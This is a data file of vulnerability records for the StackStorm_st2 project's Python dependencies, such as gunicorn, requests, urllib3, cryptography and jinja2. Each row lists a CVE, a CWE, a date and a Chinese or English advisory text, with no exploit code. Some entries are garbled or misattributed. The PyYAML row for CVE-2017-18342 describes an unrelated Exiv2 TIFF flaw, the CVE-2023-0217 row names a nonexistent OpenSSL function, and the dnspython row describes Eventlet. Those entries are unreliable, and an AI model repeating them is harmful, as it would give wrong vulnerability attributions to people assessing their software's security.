StackStorm_st2,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
StackStorm_st2,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,simplejson,,True,CVE-2014-4616,CWE-129,2014-06-20,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。simplejson是一个可扩展的JSON解码/编码器。_json module是其中的一个数据交换模块。
Python 2.7版本至3.5版本和simplejson 2.6.1之前的版本中的_json模块的‘scanstring’函数存在安全漏洞。本地攻击者可通过向‘raw_decode’函数发送带有负的指针值的‘idx’参数利用该漏洞读取任意的进程内存。",3,0
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,pymongo,,True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
StackStorm_st2,pymongo,,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
StackStorm_st2,pymongo,,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
StackStorm_st2,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
StackStorm_st2,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
StackStorm_st2,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
StackStorm_st2,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,pyyaml,,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
StackStorm_st2,pyyaml,,True,CVE-2017-18342,CWE-502,2018-06-27,CVE-2017-18342 是一个影响 Exiv2 库的整数溢出漏洞。Exiv2 是一个用于处理图像元数据的库，在处理 TIFF 图像文件时，由于对用户输入数据的边界检查不充分，可能导致整数溢出。具体来说，该漏洞出现在 readTiffDirectory 函数中，该函数在处理 TIFF 文件中的目录项时，没有正确检查涉及的偏移量和大小。这可能导致超出预期的内存分配，并进一步引发缓冲区溢出，允许攻击者通过构造恶意的 TIFF 文件来利用该漏洞，最终导致任意代码执行。,1,0
StackStorm_st2,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
StackStorm_st2,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
StackStorm_st2,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
StackStorm_st2,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
StackStorm_st2,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
StackStorm_st2,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
StackStorm_st2,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
StackStorm_st2,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
StackStorm_st2,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
StackStorm_st2,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
StackStorm_st2,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
StackStorm_st2,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
StackStorm_st2,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
StackStorm_st2,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
StackStorm_st2,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
StackStorm_st2,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
StackStorm_st2,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
StackStorm_st2,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
StackStorm_st2,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,pygments,,True,CVE-2022-40896,CWE-434,2023-07-02,"Matthäus G. Chajdas pygments是 Matthäus G. Chajdas开源的一个应用软件。提供通用语法突出显示工具功能。
pygments 2.15.0及之前版本存在安全漏洞，该漏洞源于pygments/lexers/smithy.py存在正则表达式拒绝服务（ReDoS）漏洞。",3,0
StackStorm_st2,prompt-toolkit,,True,,CWE-362,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Race Condition due to improper lock implementation in `ThreadedHistory` which could lead to a deadlock.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `prompt-toolkit` to version 3.0.13 or higher.
## References
- [GitHub Commit](https://github.com/prompt-toolkit/python-prompt-toolkit/commit/99092a8c6d4b411645ac4b84d504e5226e7eebb8#diff-48c0ff10dc3990285d19b3f54e6bfec763089ba1229dc6f9e88463a1046adad7R163)
",4,0
StackStorm_st2,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
StackStorm_st2,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
StackStorm_st2,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
StackStorm_st2,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
StackStorm_st2,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
StackStorm_st2,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
StackStorm_st2,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
StackStorm_st2,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
StackStorm_st2,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
StackStorm_st2,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
StackStorm_st2,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
StackStorm_st2,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
StackStorm_st2,orjson,,True,CVE-2024-27454,CWE-674,2024-02-26,"orjson是ijl个人开发者的一个快速、正确的 Python JSON 库。
orjson 3.9.15之前版本存在安全漏洞，该漏洞源于不限制深度嵌套JSON文档的递归。",2,2
StackStorm_st2,pyOpenSSL,,True,CVE-2018-1000807,CWE-416,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中对X509对象的处理方法存在释放后重用漏洞。远程攻击者可利用该漏洞造成拒绝服务或执行代码。",2,0
StackStorm_st2,pyOpenSSL,,True,CVE-2013-4314,CWE-20,2013-09-09,"Python是Python软件基金会的一套开源的、面向对象的程序设计语言。pyOpenSSL是其中的一个OpenSSL接口。
pyOpenSSL 0.13之前版本中的X509Extension类中存在漏洞，该漏洞源于程序没有正确地处理X.509证书的Subject Alternative Name字段中域名中的‘’字符。中间人攻击者可借助由合法证书颁发机构所发布的特制证书，利用该漏洞欺骗任意SSL服务器。",2,0
StackStorm_st2,pyOpenSSL,,True,CVE-2018-1000808,CWE-404,2018-10-08,"Python Cryptographic Authority pyopenssl是一款基于Python的OpenSSL库。

Python Cryptographic Authority pyopenssl 17.5.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,0
StackStorm_st2,zipp,,True,CVE-2024-5569,CWE-835,,zipp 是 Jason R. Coombs 开发的一个与 pathlib 兼容的 Zipfile 对象包装器。在 zipp 3.19.1 之前的版本中，存在资源管理错误的漏洞，该漏洞源于特定构造的 zip 文件可能导致无限循环，进而引发拒绝服务(DoS)。这个漏洞可以通过函数影响 `Path` 模块，例如 `joinpath`、重载的除法操作符和 `iterdir` 来触发。虽然无限循环并不消耗资源，但会导致应用程序无法响应。,3,1
StackStorm_st2,cryptography,43.0.3,True,CVE-2024-12797,CWE-392,2025-02-11,<p>OpenSSL 是一个用于实现传输层安全（TLS）和安全套接层（SSL）协议的开源软件库，广泛应用于保护互联网通信。漏洞位于文件 ssl/statem/statem_clnt.c 中的函数 tls_post_process_server_rpk，此函数用于在 TLS 握手过程中处理和验证服务器的原始公钥（RPK）。由于在 tls_post_process_server_rpk 函数调用中未充分处理 ssl_verify_rpk 的返回值，导致在 RPK 验证失败的情况下未能及时终止连接，使未经验证的服务器能够继续完成握手过程。攻击者可以利用此缺陷进行中间人攻击，从而截取或篡改通信内容。</p>,3,0
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,jinja2,,True,CVE-2014-0012,CWE-264,2014-01-18,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
Jinja2 2.7.2版本存在权限许可和访问控制问题漏洞，该漏洞源于程序没有正确创建临时目录。本地攻击者可通利用该漏洞以用户的UID提前创建临时目录，获取特权。",3,0
StackStorm_st2,jinja2,,True,CVE-2020-28493,CWE-400,2021-02-01,"Jinja2是一款基于Python的模板引擎。该产品具有完整的Unicode支持，并提供了可选的沙箱模板执行环境。
jinja2 from 0.0.0 and before 2.11.3 存在资源管理错误漏洞，该漏洞源于regex的ReDOS漏洞。",3,2
StackStorm_st2,jinja2,,True,CVE-2016-10745,CWE-134,2019-04-08,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja中存在格式化字符串错误漏洞。该漏洞源于网络系统或产品接收外部格式化字符串作为参数时，对参数类型、数量等过滤不严格。以下产品及版本受到影响：Pallets Jinja 2.8.1之前版本。",2,2
